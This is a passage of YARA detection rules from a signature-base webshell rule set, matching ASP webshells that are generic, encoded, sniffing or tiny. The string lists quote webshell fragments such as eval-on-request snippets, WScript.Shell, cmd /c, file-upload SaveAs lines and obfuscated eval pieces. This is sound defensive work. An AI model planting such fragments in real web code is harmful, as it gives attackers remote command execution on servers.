		hash = "c84a6098fbd89bd085526b220d0a3f9ab505bcba"
		hash = "b977c0ad20dc738b5dacda51ec8da718301a75d7"
		hash = "c69df00b57fd127c7d4e0e2a40d2f6c3056e0af8bfb1925938060b7e0d8c630f"
		hash = "f3b39a5da1cdde9acde077208e8e5b27feb973514dab7f262c7c6b2f8f11eaa7"
		hash = "0e9d92807d990144c637d8b081a6a90a74f15c7337522874cf6317092ea2d7c1"
		hash = "ebbc485e778f8e559ef9c66f55bb01dc4f5dcce9c31ccdd150e2c702c4b5d9e1"
		hash = "44b4068bfbbb8961e16bae238ad23d181ac9c8e4fcb4b09a66bbcd934d2d39ee"
		hash = "c5a4e188780b5513f34824904d56bf6e364979af6782417ccc5e5a8a70b4a95a"
		hash = "41a3cc668517ec207c990078bccfc877e239b12a7ff2abe55ff68352f76e819c"
		hash = "2faad5944142395794e5e6b90a34a6204412161f45e130aeb9c00eff764f65fc"
		hash = "d0c5e641120b8ea70a363529843d9f393074c54af87913b3ab635189fb0c84cb"
		hash = "28cfcfe28419a399c606bf96505bc68d6fe05624dba18306993f9fe0d398fbe1"
		logic_hash = "1b969e098a0b2c86ceba9cbb7f31770ba04f1a4c225716ea27d7e4e4177c90c4"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$susasp1 = "/*-/*-*/"
		$susasp2 = "(\"%1"
		$susasp3 = /[Cc]hr\([Ss]tr\(/
		$susasp4 = "cmd.exe"
		$susasp5 = "cmd /c"
		$susasp7 = "FromBase64String"
		$susasp8 = "UmVxdWVzdC"
		$susasp9 = "cmVxdWVzdA"
		$susasp10 = "/*//*/"
		$susasp11 = "(\"/*/\""
		$susasp12 = "eval(eval("
		$fp1 = "eval a"
		$fp2 = "'Eval'"
		$fp3 = "Eval(\""
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_payload0 = "eval_r" fullword nocase wide ascii
		$asp_payload1 = /\beval\s/ nocase wide ascii
		$asp_payload2 = /\beval\(/ nocase wide ascii
		$asp_payload3 = /\beval\"\"/ nocase wide ascii
		$asp_payload4 = /:\s{0,10}eval\b/ nocase wide ascii
		$asp_payload8 = /\bexecute\s?\(/ nocase wide ascii
		$asp_payload9 = /\bexecute\s[\w"]/ nocase wide ascii
		$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
		$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
		$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
		$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
		$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
		$asp_multi_payload_one2 = "addcode" fullword wide ascii
		$asp_multi_payload_one3 = /\.run\b/ wide ascii
		$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
		$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
		$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
		$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
		$asp_multi_payload_three2 = "Process" fullword wide ascii
		$asp_multi_payload_three3 = ".Start" wide ascii
		$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
		$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
		$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
		$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
		$asp_multi_payload_five2 = ".Start" nocase wide ascii
		$asp_multi_payload_five3 = ".Filename" nocase wide ascii
		$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and (( any of ($asp_payload*) or all of ($asp_multi_payload_one*) or all of ($asp_multi_payload_two*) or all of ($asp_multi_payload_three*) or all of ($asp_multi_payload_four*) or all of ($asp_multi_payload_five*)) or ( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*)))) and not any of ($fp*) and ( filesize <200 or ( filesize <1000 and any of ($susasp*)))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Encoded : FILE {
    meta:
		description = "Webshell in VBscript or JScript encoded using *.Encode plus a suspicious string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "67c0e1f6-6da5-569c-ab61-8b8607429471"
		date = "2021-03-14"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3658-L3768"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399"
		hash = "9885ee1952b5ad9f84176c9570ad4f0e32461c92"
		hash = "27a020c5bc0dbabe889f436271df129627b02196"
		hash = "f41f8c82b155c3110fc1325e82b9ee92b741028b"
		hash = "af40f4c36e3723236c59dc02f28a3efb047d67dd"
		logic_hash = "dc33423874a49edfe9994db50959e6a55e2d475f4cd7d0b1b0a288c4ee1f7961"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$encoded1 = "VBScript.Encode" nocase wide ascii
		$encoded2 = "JScript.Encode" nocase wide ascii
		$data1 = "#@~^" wide ascii
		$sus1 = "shell" nocase wide ascii
		$sus2 = "cmd" fullword wide ascii
		$sus3 = "password" fullword wide ascii
		$sus4 = "UserPass" fullword wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		filesize <500KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and any of ($encoded*) and any of ($data*) and ( any of ($sus*) or ( filesize <20KB and #data1>4) or ( filesize <700 and #data1>0))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Encoded_Aspcoding : FILE {
    meta:
		description = "ASP Webshell encoded using ASPEncodeDLL.AspCoding"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "788a8dae-bcb8-547c-ba17-e1f14bc28f34"
		date = "2021-03-14"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3770-L3876"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7cfd184ab099c4d60b13457140493b49c8ba61ee"
		hash = "f5095345ee085318235c11ae5869ae564d636a5342868d0935de7582ba3c7d7a"
		logic_hash = "a0f0b8585b28b13a90c5d112997cacea00af8c89c81eda5edf05508ad41459ab"
		score = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$encoded1 = "ASPEncodeDLL" fullword nocase wide ascii
		$encoded2 = ".Runt" nocase wide ascii
		$encoded3 = "Request" fullword nocase wide ascii
		$encoded4 = "Response" fullword nocase wide ascii
		$data1 = "AspCoding.EnCode" wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		filesize <500KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and all of ($encoded*) and any of ($data*)
}
rule SIGNATURE_BASE_WEBSHELL_ASP_By_String : FILE {
    meta:
		description = "Known ASP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "4705b28b-2ffa-53d1-b727-1a9fc2a7dd69"
		date = "2021-01-13"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L3878-L4056"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f72252b13d7ded46f0a206f63a1c19a66449f216"
		hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
		hash = "56a54fe1f8023455800fd0740037d806709ffb9ece1eb9e7486ad3c3e3608d45"
		hash = "4ef5d8b51f13b36ce7047e373159d7bb42ca6c9da30fad22e083ab19364c9985"
		hash = "e90c3c270a44575c68d269b6cf78de14222f2cbc5fdfb07b9995eb567d906220"
		hash = "8a38835f179e71111663b19baade78cc3c9e1f6fcc87eb35009cbd09393cbc53"
		hash = "f2883e9461393b33feed4139c0fc10fcc72ff92924249eb7be83cb5b76f0f4ee"
		hash = "10cca59c7112dfb1c9104d352e0504f842efd4e05b228b6f34c2d4e13ffd0eb6"
		hash = "ed179e5d4d365b0332e9ffca83f66ee0afe1f1b5ac3c656ccd08179170a4d9f7"
		hash = "ce3273e98e478a7e95fccce0a3d3e8135c234a46f305867f2deacd4f0efa7338"
		hash = "65543373b8bd7656478fdf9ceeacb8490ff8976b1fefc754cd35c89940225bcf"
		hash = "de173ea8dcef777368089504a4af0804864295b75e51794038a6d70f2bcfc6f5"
		logic_hash = "b6ff83bc501753b893a0f5e60c6aafa292617279c0855ce3ba2d0b9b73325e8a"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$asp_string1 = "tseuqer lave" wide ascii
		$asp_string2 = ":eval request(" wide ascii
		$asp_string3 = ":eval request(" wide ascii
		$asp_string4 = "SItEuRl=\"http://www.zjjv.com\"" wide ascii
		$asp_string5 = "ServerVariables(\"HTTP_HOST\"),\"gov.cn\"" wide ascii
		$asp_string6 = /e\+.-v\+.-a\+.-l/ wide ascii
		$asp_string7 = "r+x-e+x-q+x-u" wide ascii
		$asp_string8 = "add6bb58e139be10" fullword wide ascii
		$asp_string9 = "WebAdmin2Y.x.y(\"" wide ascii
		$asp_string10 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[" wide ascii
		$asp_string11 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(" wide ascii
		$asp_string12 = "UmVxdWVzdC5JdGVtWyJ" wide ascii
		$asp_string13 = "UAdgBhAGwAKA" wide ascii
		$asp_string14 = "lAHYAYQBsACgA" wide ascii
		$asp_string15 = "ZQB2AGEAbAAoA" wide ascii
		$asp_string16 = "IAZQBxAHUAZQBzAHQAKA" wide ascii
		$asp_string17 = "yAGUAcQB1AGUAcwB0ACgA" wide ascii
		$asp_string18 = "cgBlAHEAdQBlAHMAdAAoA" wide ascii
		$asp_string19 = "\"ev\"&\"al" wide ascii
		$asp_string20 = "\"Sc\"&\"ri\"&\"p" wide ascii
		$asp_string21 = "C\"&\"ont\"&\"" wide ascii
		$asp_string22 = "\"vb\"&\"sc" wide ascii
		$asp_string23 = "\"A\"&\"do\"&\"d" wide ascii
		$asp_string24 = "St\"&\"re\"&\"am\"" wide ascii
		$asp_string25 = "*/eval(" wide ascii
		$asp_string26 = "\"e\"&\"v\"&\"a\"&\"l" nocase
		$asp_string27 = "<%eval\"\"&(\"" nocase wide ascii
		$asp_string28 = "6877656D2B736972786677752B237E232C2A" wide ascii
		$asp_string29 = "ws\"&\"cript.shell" wide ascii
		$asp_string30 = "SerVer.CreAtEoBjECT(\"ADODB.Stream\")" wide ascii
		$asp_string31 = "ASPShell - web based shell" wide ascii
		$asp_string32 = "<++ CmdAsp.asp ++>" wide ascii
		$asp_string33 = "\"scr\"&\"ipt\"" wide ascii
		$asp_string34 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" wide ascii
		$asp_string35 = "\"she\"&\"ll." wide ascii
		$asp_string36 = "LH\"&\"TTP" wide ascii
		$asp_string37 = "<title>Web Sniffer</title>" wide ascii
		$asp_string38 = "<title>WebSniff" wide ascii
		$asp_string39 = "cript\"&\"ing" wide ascii
		$asp_string40 = "tcejbOmetsySeliF.gnitpircS" wide ascii
		$asp_string41 = "tcejbOetaerC.revreS" wide ascii
		$asp_string42 = "This file is part of A Black Path Toward The Sun (\"ABPTTS\")" wide ascii
		$asp_string43 = "if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))" wide ascii
		$asp_string44 = "if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))" wide ascii
		$asp_string45 = "Response.Write(Server.HtmlEncode(ExcutemeuCmd(txtArg.Text)));" wide ascii
		$asp_string46 = "\"c\" + \"m\" + \"d\"" wide ascii
		$asp_string47 = "\".\"+\"e\"+\"x\"+\"e\"" wide ascii
		$asp_string48 = "Tas9er" fullword wide ascii
		$asp_string49 = "<%@ Page Language=\"\\u" wide ascii
		$asp_string50 = "BinaryRead(\\u" wide ascii
		$asp_string51 = "Request.\\u" wide ascii
		$asp_string52 = "System.Buffer.\\u" wide ascii
		$asp_string53 = "System.Net.\\u" wide ascii
		$asp_string54 = ".\\u0052\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\"" wide ascii
		$asp_string55 = "\\u0041\\u0073\\u0073\\u0065\\u006d\\u0062\\u006c\\u0079.\\u004c\\u006f\\u0061\\u0064" wide ascii
		$asp_string56 = "\\U00000052\\U00000065\\U00000071\\U00000075\\U00000065\\U00000073\\U00000074[\"" wide ascii
		$asp_string57 = "*/\\U0000" wide ascii
		$asp_string58 = "\\U0000FFFA" wide ascii
		$asp_string59 = "\"e45e329feb5d925b\"" wide ascii
		$asp_string60 = ">POWER!shelled<" wide ascii
		$asp_string61 = "@requires xhEditor" wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		filesize <200KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and any of ($asp_string*)
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Sniffer : FILE {
    meta:
		description = "ASP webshell which can sniff local traffic"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b5704c19-fce1-5210-8185-4839c1c5a344"
		date = "2021-03-14"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4058-L4193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1206c22de8d51055a5e3841b4542fb13aa0f97dd"
		hash = "60d131af1ed23810dbc78f85ee32ffd863f8f0f4"
		hash = "c3bc4ab8076ef184c526eb7f16e08d41b4cec97e"
		hash = "ed5938c04f61795834751d44a383f8ca0ceac833"
		logic_hash = "874ec4c5dff024a899976e46cd553b52c361779a5507cf08ff0de596fd460d41"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sniff1 = "Socket(" wide ascii
		$sniff2 = ".Bind(" wide ascii
		$sniff3 = ".SetSocketOption(" wide ascii
		$sniff4 = ".IOControl(" wide ascii
		$sniff5 = "PacketCaptureWriter" fullword wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and filesize <30KB and all of ($sniff*)
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Generic_Tiny : FILE {
    meta:
		description = "Generic tiny ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
		date = "2021-01-07"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4195-L4402"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
		hash = "52ce724580e533da983856c4ebe634336f5fd13a"
		hash = "0864f040a37c3e1cef0213df273870ed6a61e4bc"
		hash = "b184dc97b19485f734e3057e67007a16d47b2a62"
		logic_hash = "62012312876adb97f24ff39af041263d7678a4264374398907b2442731e586d7"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$fp1 = "net.rim.application.ipproxyservice.AdminCommand.execute"
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }
		$asp_payload0 = "eval_r" fullword nocase wide ascii
		$asp_payload1 = /\beval\s/ nocase wide ascii
		$asp_payload2 = /\beval\(/ nocase wide ascii
		$asp_payload3 = /\beval\"\"/ nocase wide ascii
		$asp_payload4 = /:\s{0,10}eval\b/ nocase wide ascii
		$asp_payload8 = /\bexecute\s?\(/ nocase wide ascii
		$asp_payload9 = /\bexecute\s[\w"]/ nocase wide ascii
		$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
		$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
		$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
		$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
		$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
		$asp_multi_payload_one2 = "addcode" fullword wide ascii
		$asp_multi_payload_one3 = /\.run\b/ wide ascii
		$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
		$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
		$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
		$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
		$asp_multi_payload_three2 = "Process" fullword wide ascii
